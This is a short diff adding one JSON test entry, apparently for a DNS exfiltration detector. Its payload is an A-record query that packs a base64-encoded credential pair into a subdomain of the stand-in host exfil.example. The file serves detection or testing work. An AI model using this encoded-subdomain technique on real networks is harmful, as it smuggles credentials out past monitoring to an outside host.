@@ -1,0 +1,10 @@
+{
+    "categories": ["EXFILTRATION"],
+    "tags": ["dns", "exfiltration", "base64"],
+    "description": "DNS exfiltration via long encoded subdomain",
+    "payload": {
+      "qname": "QWxhZGRpbjpPcGVuU2VzYW1lMTIzNDU2Nzg5.exfil.example",
+      "qtype": "A"
+    }
+  }
+  
